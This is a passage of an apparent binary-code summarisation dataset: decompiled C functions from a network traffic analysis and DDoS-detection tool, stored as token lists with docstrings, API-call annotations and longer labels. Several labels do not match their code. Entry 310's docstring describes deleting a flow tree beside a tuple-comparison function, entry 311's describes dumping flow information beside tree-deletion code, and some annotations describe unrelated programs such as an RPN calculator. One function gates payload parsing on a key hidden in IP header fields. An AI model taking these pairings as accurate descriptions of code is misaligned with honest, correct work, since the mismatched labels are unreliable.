            "long_options",
            "[",
            "i",
            "]",
            ".",
            "name",
            ")",
            "{",
            "printf",
            "(",
            "\" -%c, --%-13s %s\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "val",
            ",",
            "long_options",
            "[",
            "i",
            "]",
            ".",
            "name",
            ",",
            "options_help",
            "[",
            "i",
            "]",
            ")",
            ";",
            "+",
            "+",
            "i",
            ";",
            "}",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"print\" appears to be a part of a larger program involving file input/output and linked list manipulation, possibly designed to output data to the console or a file, but its exact purpose and implementation can't be definitively determined without further context or code.",
            "The `printf` function in the provided code snippets appears to be a custom implementation for output formatting, possibly tailored for use in a specific system or environment, with additional functionality such as handling RPN calculator operations and defining formatting symbols for specific platforms."
        ],
        "longer_label": "The code defines a function, `traffana_print_usage`, which prints usage information for a program with options, using custom formatting for output, but without sufficient context to determine its exact purpose or integration within a larger program."
    },
    {
        "id": 308,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "and",
            "processes",
            "input",
            "arguments",
            "to",
            "configure",
            "a",
            "traffic",
            "analysis",
            "tool",
            ",",
            "setting",
            "various",
            "parameters",
            "such",
            "as",
            "interface",
            ",",
            "output",
            "file",
            ",",
            "pcap",
            "file",
            ",",
            "verbosity",
            ",",
            "thresholds",
            ",",
            "and",
            "tracking",
            "mode",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_input_t",
            "*",
            "input",
            ",",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "int",
            "argc",
            ")",
            "{",
            "int",
            "opt_idx",
            ";",
            "int",
            "can_run",
            ";",
            "int",
            "opt",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "opt_idx",
            "=",
            "0",
            ";",
            "can_run",
            "=",
            "0",
            ";",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "1",
            ")",
            "{",
            "traffana_print_usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "opt",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "argv",
            ",",
            "\"hi:r:T:vw:z:p:b:f:s:\"",
            ",",
            "long_options",
            ",",
            "&",
            "opt_idx",
            ")",
            ";",
            "if",
            "(",
            "opt",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "opt",
            "-",
            "63",
            ")",
            "<",
            "=",
            "0x3B",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "abort",
            "(",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "can_run",
            ")",
            "{",
            "traffana_print_usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "input",
            "-",
            ">",
            "interface",
            "[",
            "0",
            "]",
            "&",
            "&",
            "input",
            "-",
            ">",
            "pcap_file",
            "[",
            "0",
            "]",
            ")",
            "{",
            "puts",
            "(",
            "\"Either pcap or interface should be specified\"",
            ")",
            ";",
            "traffana_print_usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "tuple_mode",
            ")",
            "{",
            "puts",
            "(",
            "\"Please specify tuple tracking mode\"",
            ")",
            ";",
            "traffana_print_usage",
            "(",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "input",
            "-",
            ">",
            "epoch",
            "=",
            "=",
            "0",
            ".",
            "0",
            ")",
            "input",
            "-",
            ">",
            "epoch",
            "=",
            "1",
            ".",
            "0",
            ";",
            "input",
            "-",
            ">",
            "loghdl",
            "=",
            "(",
            "FILE",
            "*",
            ")",
            "_bss_start",
            ";",
            "if",
            "(",
            "input",
            "-",
            ">",
            "output_file",
            "[",
            "0",
            "]",
            ")",
            "{",
            "input",
            "-",
            ">",
            "loghdl",
            "=",
            "fopen",
            "(",
            "input",
            "-",
            ">",
            "output_file",
            ",",
            "modes",
            ")",
            ";",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "loghdl",
            ")",
            "{",
            "perror",
            "(",
            "\"Error opening output file. Reason\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"ana_print_usage\" likely prints out the usage instructions or help information for a program or function named \"ana\".",
            "The function `traffana_print_usage` likely prints out usage instructions or information related to a traffic analysis tool, although without the actual code snippets provided, the specifics cannot be determined."
        ],
        "longer_label": "The provided code appears to be a function named \"traffana_read_input\" which reads input parameters, processes them using getopt_long, handles errors, and sets up logging and file output, with annotations suggesting the presence of functions for printing usage instructions."
    },
    {
        "id": 309,
        "docstring_tokens": [
            "The",
            "code",
            "compares",
            "two",
            "5-tuple",
            "traffic",
            "flow",
            "structures",
            "based",
            "on",
            "source",
            "and",
            "destination",
            "addresses",
            ",",
            "ports",
            ",",
            "and",
            "protocol",
            ",",
            "returning",
            "-1",
            "if",
            "the",
            "first",
            "flow",
            "is",
            "less",
            "than",
            "the",
            "second",
            ",",
            "1",
            "if",
            "greater",
            ",",
            "and",
            "0",
            "if",
            "equal",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "void",
            "*",
            "a",
            ",",
            "const",
            "void",
            "*",
            "b",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            "<",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            ">",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            "+",
            "1",
            ")",
            "<",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            "+",
            "1",
            ")",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            "+",
            "1",
            ")",
            ">",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            "+",
            "1",
            ")",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "a",
            "+",
            "4",
            ")",
            "<",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "b",
            "+",
            "4",
            ")",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "a",
            "+",
            "4",
            ")",
            ">",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "b",
            "+",
            "4",
            ")",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "a",
            "+",
            "5",
            ")",
            "<",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "b",
            "+",
            "5",
            ")",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "a",
            "+",
            "5",
            ")",
            ">",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "b",
            "+",
            "5",
            ")",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "a",
            "+",
            "12",
            ")",
            ">",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "b",
            "+",
            "12",
            ")",
            ")",
            "return",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "a",
            "+",
            "12",
            ")",
            ">",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "b",
            "+",
            "12",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "This code defines a comparison function `traffana_compare_5_tuple` using `_DWORD`, `_WORD`, and `_BYTE` types to compare two 5-tuple elements, returning -1 if the first tuple is smaller, 1 if it's larger, and 0 if they're equal."
    },
    {
        "id": 310,
        "docstring_tokens": [
            "This",
            "code",
            "deletes",
            "the",
            "flow",
            "tree",
            "structure",
            "and",
            "sets",
            "it",
            "to",
            "NULL",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "const",
            "void",
            "*",
            "a",
            ",",
            "const",
            "void",
            "*",
            "b",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            "<",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            ">",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            ")",
            "return",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            "+",
            "1",
            ")",
            ">",
            "=",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            "+",
            "1",
            ")",
            ")",
            "return",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a",
            "+",
            "1",
            ")",
            ">",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "b",
            "+",
            "1",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a comparison function `traffana_compare_2_tuple` for sorting tuples of two integers, where the first element takes precedence and if they are equal, the second element is considered, returning -1 if the first tuple is less than the second, 1 if greater, and -1 if the second tuple is less than the first."
    },
    {
        "id": 311,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "dumps",
            "flow",
            "information",
            ",",
            "including",
            "IP",
            "addresses",
            ",",
            "ports",
            ",",
            "and",
            "protocol",
            ",",
            "if",
            "the",
            "VERBOSE",
            "macro",
            "is",
            "defined",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "tdestroy",
            "(",
            "flow_tree",
            ",",
            "(",
            "__free_fn_t",
            ")",
            "traffana_free_flow",
            ")",
            ";",
            "flow_tree",
            "=",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function named `traffana_delete_flow_tree` that deletes a tree structure called `flow_tree` using the `tdestroy` function, and sets `flow_tree` to null."
    },
    {
        "id": 312,
        "docstring_tokens": [
            "The",
            "ParseIP",
            "function",
            "parses",
            "and",
            "validates",
            "an",
            "IP",
            "packet",
            ",",
            "checking",
            "for",
            "correct",
            "length",
            ",",
            "version",
            ",",
            "header",
            "length",
            ",",
            "and",
            "protocol",
            "type",
            "before",
            "further",
            "processing",
            "based",
            "on",
            "TCP",
            "protocol",
            ",",
            "IP",
            "ID",
            ",",
            "and",
            "TOS",
            "values",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "u_char",
            "*",
            "args",
            ",",
            "const",
            "pcap_pkthdr",
            "*",
            "pkthdr",
            ",",
            "const",
            "u_char",
            "*",
            "packet",
            ")",
            "{",
            "int",
            "version",
            ";",
            "unsigned",
            "int",
            "hlen",
            ";",
            "unsigned",
            "int",
            "len",
            ";",
            "const",
            "my_ip",
            "*",
            "ip_0",
            ";",
            "u_int",
            "length",
            ";",
            "ip_0",
            "=",
            "(",
            "const",
            "my_ip",
            "*",
            ")",
            "(",
            "packet",
            "+",
            "14",
            ")",
            ";",
            "length",
            "=",
            "pkthdr",
            "-",
            ">",
            "len",
            "-",
            "14",
            ";",
            "if",
            "(",
            "length",
            "<",
            "=",
            "0x13",
            ")",
            "{",
            "printf",
            "(",
            "\"Packet length is incorrect %d\"",
            ",",
            "length",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "len",
            "=",
            "ntohs",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "packet",
            "+",
            "8",
            ")",
            ")",
            ";",
            "hlen",
            "=",
            "ip_0",
            "-",
            ">",
            "ip_vhl",
            "&",
            "0xF",
            ";",
            "version",
            "=",
            "ip_0",
            "-",
            ">",
            "ip_vhl",
            ">",
            ">",
            "4",
            ";",
            "ntohs",
            "(",
            "ip_0",
            "-",
            ">",
            "ip_off",
            ")",
            ";",
            "if",
            "(",
            "version",
            "!",
            "=",
            "4",
            ")",
            "{",
            "perror",
            "(",
            "\"Unknown error\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "hlen",
            "<",
            "=",
            "4",
            ")",
            "{",
            "perror",
            "(",
            "\"Bad header length\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "length",
            "<",
            "len",
            ")",
            "{",
            "perror",
            "(",
            "\"Truncated IP\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "ip_0",
            "-",
            ">",
            "ip_p",
            "=",
            "=",
            "6",
            ")",
            "{",
            "puts",
            "(",
            "\"Protocal: TCP\"",
            ")",
            ";",
            "printf",
            "(",
            "\"IPID: %hu\\n\"",
            ",",
            "ip_0",
            "-",
            ">",
            "ip_id",
            ")",
            ";",
            "printf",
            "(",
            "\"TOS: %u\\n\"",
            ",",
            "ip_0",
            "-",
            ">",
            "ip_tos",
            ")",
            ";",
            "if",
            "(",
            "CheckKey",
            "(",
            "ip_0",
            "-",
            ">",
            "ip_tos",
            ",",
            "ip_0",
            "-",
            ">",
            "ip_id",
            ",",
            "0",
            ")",
            ")",
            "{",
            "puts",
            "(",
            "\"Reading payload\"",
            ")",
            ";",
            "ParseTCP",
            "(",
            "args",
            ",",
            "pkthdr",
            ",",
            "packet",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "CheckKey",
            "(",
            "ip_0",
            "-",
            ">",
            "ip_tos",
            ",",
            "ip_0",
            "-",
            ">",
            "ip_id",
            ",",
            "1",
            ")",
            ")",
            "{",
            "ParsePattern",
            "(",
            "args",
            ",",
            "pkthdr",
            ",",
            "packet",
            ")",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"Packet tossed wrong key\"",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is being redefined and used in the provided code snippets to manipulate the output formatting and perform tasks like printing formatted text and possibly handling special cases like Infinity and NaN representations, likely as part of a larger project or system."
        ],
        "longer_label": "The provided code is a C function named ParseIP, which parses IP packets received via pcap, validates packet length, IP version, header length, and protocol type (TCP), printing relevant information and calling other functions based on certain conditions, while also handling potential errors using perror and exit functions."
    },
    {
        "id": 313,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "socket",
            ",",
            "notifies",
            "an",
            "endhost",
            "about",
            "a",
            "detected",
            "attack",
            "by",
            "sending",
            "a",
            "message",
            "via",
            "UDP",
            "to",
            "a",
            "specified",
            "port",
            "on",
            "the",
            "loopback",
            "address",
            ",",
            "and",
            "handles",
            "any",
            "errors",
            "that",
            "may",
            "occur",
            "in",
            "the",
            "process",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "size_t",
            "v0",
            ";",
            "int",
            "sockfd",
            ";",
            "sockaddr_in",
            "srvaddr",
            ";",
            "char",
            "buf",
            "[",
            "64",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "v4",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "buf",
            ")",
            ")",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "2",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "srvaddr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "srvaddr",
            ")",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_family",
            "=",
            "2",
            ";",
            "srvaddr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "0xFB41u",
            ")",
            ";",
            "srvaddr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "0x7F000001u",
            ")",
            ";",
            "buf",
            "[",
            "0",
            "]",
            "=",
            "65",
            ";",
            "v0",
            "=",
            "strlen",
            "(",
            "buf",
            ")",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "sendto",
            "(",
            "sockfd",
            ",",
            "buf",
            ",",
            "v0",
            ",",
            "0",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "srvaddr",
            ",",
            "0x10u",
            ")",
            "<",
            "0",
            ")",
            "perror",
            "(",
            "\"Error notifyinf endhost about DDOS. Reason\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error creating socket. Reason\"",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsq is likely used to read a value from the FS (or GS) segment register in x86 assembly language, typically employed for accessing thread-local storage or other system-specific data structures.",
            "The function `memset` is being defined and utilized in multiple code snippets to initialize a block of memory with a specific value, typically used for zeroing out memory or setting it to a particular byte pattern."
        ],
        "longer_label": "The provided code defines a function `traffana_notify_endhost` that attempts to notify a remote end host about a DDOS event by creating a UDP socket, initializing a sockaddr_in structure with specific IP and port values, and sending a fixed payload ('A' character) using `sendto`."
    },
    {
        "id": 314,
        "docstring_tokens": [
            "The",
            "code",
            "logs",
            "attack",
            "information",
            "to",
            "a",
            "file",
            ",",
            "notifies",
            "the",
            "end",
            "host",
            "once",
            ",",
            "and",
            "flushes",
            "the",
            "output",
            "stream",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_input_t",
            "*",
            "input",
            ",",
            "traffana_epoch_t",
            "*",
            "epoch",
            ",",
            "double",
            "curr_time",
            ")",
            "{",
            "if",
            "(",
            "!",
            "endhost_notified_6378",
            ")",
            "{",
            "endhost_notified_6378",
            "=",
            "1",
            ";",
            "traffana_notify_endhost",
            "(",
            ")",
            ";",
            "}",
            "fprintf",
            "(",
            "input",
            "-",
            ">",
            "attack_loghdl",
            ",",
            "\"%.6f  %.6f  %-6u  %-10u  %-4u\\n\"",
            ",",
            "curr_time",
            ",",
            "input",
            "-",
            ">",
            "global_time",
            ",",
            "epoch",
            "-",
            ">",
            "num_pkts",
            ",",
            "epoch",
            "-",
            ">",
            "num_bytes",
            ",",
            "epoch",
            "-",
            ">",
            "num_flows",
            ")",
            ";",
            "fflush",
            "(",
            "input",
            "-",
            ">",
            "attack_loghdl",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"notify\" likely handles notifications related to packet offload operations and scan events in a network protocol implementation."
        ],
        "longer_label": "The provided code is a function named \"traffana_log_attackinfo\" which logs attack information, notifies an end host if not already notified, and prints time, packet, byte, and flow information to a log file, likely related to network protocol implementations and packet offload operations."
    },
    {
        "id": 315,
        "docstring_tokens": [
            "The",
            "code",
            "tracks",
            "source",
            "addresses",
            "for",
            "a",
            "traffic",
            "analysis",
            "flow",
            ",",
            "creating",
            "a",
            "new",
            "entry",
            "if",
            "not",
            "found",
            "in",
            "the",
            "hash",
            "table",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_flow_t",
            "*",
            "key",
            ",",
            "traffana_epoch_t",
            "*",
            "epoch",
            ")",
            "{",
            "traffana_epoch_t",
            "*",
            "v2",
            ";",
            "void",
            "*",
            "data",
            ";",
            "__int64",
            "v4",
            ";",
            "traffana_flow_t",
            "*",
            "v5",
            ";",
            "ENTRY",
            "v6",
            ";",
            "traffana_epoch_t",
            "*",
            "epocha",
            ";",
            "ENTRY",
            "*",
            "found",
            ";",
            "traffana_flow_t",
            "*",
            "sflow",
            ";",
            "ENTRY",
            "entry",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "epocha",
            "=",
            "v2",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "found",
            "=",
            "0L",
            "L",
            ";",
            "entry",
            ".",
            "key",
            "=",
            "(",
            "char",
            "*",
            ")",
            "key",
            ";",
            "data",
            "=",
            "entry",
            ".",
            "data",
            ";",
            "hsearch_r",
            "(",
            "*",
            "(",
            "ENTRY",
            "*",
            ")",
            "&",
            "key",
            ",",
            "FIND",
            ",",
            "&",
            "found",
            ",",
            "&",
            "saddr_htbl",
            ")",
            ";",
            "if",
            "(",
            "!",
            "found",
            ")",
            "{",
            "sflow",
            "=",
            "(",
            "traffana_flow_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "sflow",
            ")",
            "__assert_fail",
            "(",
            "\"sflow != NULL\"",
            ",",
            "\"traffana.c\"",
            ",",
            "0x16Au",
            ",",
            "\"traffana_track_source_addr\"",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "key",
            "-",
            ">",
            "src_port",
            ";",
            "v5",
            "=",
            "sflow",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "sflow",
            "-",
            ">",
            "src_addr",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "key",
            "-",
            ">",
            "src_addr",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v5",
            "-",
            ">",
            "src_port",
            "=",
            "v4",
            ";",
            "+",
            "+",
            "epocha",
            "-",
            ">",
            "num_src_addrs",
            ";",
            "entry",
            ".",
            "key",
            "=",
            "(",
            "char",
            "*",
            ")",
            "sflow",
            ";",
            "entry",
            ".",
            "data",
            "=",
            "sflow",
            ";",
            "v6",
            ".",
            "key",
            "=",
            "(",
            "char",
            "*",
            ")",
            "sflow",
            ";",
            "v6",
            ".",
            "data",
            "=",
            "sflow",
            ";",
            "hsearch_r",
            "(",
            "v6",
            ",",
            "ENTER",
            ",",
            "&",
            "found",
            ",",
            "&",
            "saddr_htbl",
            ")",
            ";",
            "if",
            "(",
            "!",
            "found",
            ")",
            "__assert_fail",
            "(",
            "\"found != NULL\"",
            ",",
            "\"traffana.c\"",
            ",",
            "0x172u",
            ",",
            "\"traffana_track_source_addr\"",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfs is used to read the segment selector for the FS segment register in x86 assembly language, allowing access to the FS segment's base address.",
            "The function \"hsearch\" is likely intended to implement System V's hash table functionality, allowing for efficient storage and retrieval of key-value pairs."
        ],
        "longer_label": "The code defines a function `traffana_track_source_addr` that tracks source addresses in a hash table, utilizing assembly language to access the FS segment register for memory management, and likely implements System V's hash table functionality for efficient storage and retrieval of key-value pairs."
    },
    {
        "id": 316,
        "docstring_tokens": [
            "The",
            "code",
            "extracts",
            "flow",
            "information",
            "from",
            "network",
            "packets",
            ",",
            "categorizes",
            "them",
            "based",
            "on",
            "protocol",
            ",",
            "and",
            "tracks",
            "the",
            "number",
            "of",
            "packets",
            ",",
            "bytes",
            ",",
            "flows",
            ",",
            "and",
            "source",
            "addresses",
            "to",
            "detect",
            "potential",
            "attacks",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "traffana_input_t",
            "*",
            "input",
            ",",
            "traffana_epoch_t",
            "*",
            "epoch",
            ",",
            "const",
            "uint8_t",
            "*",
            "data",
            ",",
            "double",
            "curr_time",
            ")",
            "{",
            "int",
            "v4",
            ";",
            "void",
            "*",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "int",
            "(",
            "*",
            "compare_func",
            ")",
            "(",
            "const",
            "void",
            "*",
            ",",
            "const",
            "void",
            "*",
            ")",
            ";",
            "traffana_flow_t",
            "*",
            "flow",
            ";",
            "traffana_flow_t",
            "key",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "v10",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "key",
            ".",
            "src_addr",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "data",
            "+",
            "26",
            ")",
            ";",
            "key",
            ".",
            "dst_addr",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "data",
            "+",
            "30",
            ")",
            ";",
            "key",
            ".",
            "proto",
            "=",
            "data",
            "[",
            "23",
            "]",
            ";",
            "v4",
            "=",
            "data",
            "[",
            "23",
            "]",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "17",
            ")",
            "{",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_udp_pkts",
            ";",
            "key",
            ".",
            "src_port",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "data",
            "+",
            "17",
            ")",
            ";",
            "key",
            ".",
            "dst_port",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "data",
            "+",
            "18",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "data",
            "[",
            "23",
            "]",
            ">",
            "0x11u",
            ")",
            "{",
            "LABEL_9",
            ":",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_other_pkts",
            ";",
            "return",
            ";",
            "}",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "1",
            ")",
            "{",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_icmp_pkts",
            ";",
            "key",
            ".",
            "src_port",
            "=",
            "0",
            ";",
            "key",
            ".",
            "dst_port",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "v4",
            "!",
            "=",
            "6",
            ")",
            "goto",
            "LABEL_9",
            ";",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_tcp_pkts",
            ";",
            "key",
            ".",
            "src_port",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "data",
            "+",
            "17",
            ")",
            ";",
            "key",
            ".",
            "dst_port",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "data",
            "+",
            "18",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "input",
            "-",
            ">",
            "tuple_mode",
            "=",
            "=",
            "2",
            ")",
            "{",
            "compare_func",
            "=",
            "(",
            "int",
            "(",
            "*",
            ")",
            "(",
            "const",
            "void",
            "*",
            ",",
            "const",
            "void",
            "*",
            ")",
            ")",
            "traffana_compare_2_tuple",
            ";",
            "v5",
            "=",
            "tfind",
            "(",
            "&",
            "key",
            ",",
            "&",
            "flow_tree",
            ",",
            "(",
            "__compar_fn_t",
            ")",
            "traffana_compare_2_tuple",
            ")",
            ";",
            "}",
            "else",
            "{",
            "compare_func",
            "=",
            "(",
            "int",
            "(",
            "*",
            ")",
            "(",
            "const",
            "void",
            "*",
            ",",
            "const",
            "void",
            "*",
            ")",
            ")",
            "traffana_compare_5_tuple",
            ";",
            "v5",
            "=",
            "tfind",
            "(",
            "&",
            "key",
            ",",
            "&",
            "flow_tree",
            ",",
            "(",
            "__compar_fn_t",
            ")",
            "traffana_compare_5_tuple",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "v5",
            ")",
            "{",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_flows",
            ";",
            "if",
            "(",
            "key",
            ".",
            "proto",
            "=",
            "=",
            "17",
            ")",
            "{",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_udp_flows",
            ";",
            "}",
            "else",
            "if",
            "(",
            "key",
            ".",
            "proto",
            "=",
            "=",
            "6",
            ")",
            "{",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_tcp_flows",
            ";",
            "}",
            "else",
            "{",
            "+",
            "+",
            "epoch",
            "-",
            ">",
            "num_icmp_flows",
            ";",
            "}",
            "flow",
            "=",
            "(",
            "traffana_flow_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "flow",
            ")",
            "__assert_fail",
            "(",
            "\"flow != NULL\"",
            ",",
            "\"traffana.c\"",
            ",",
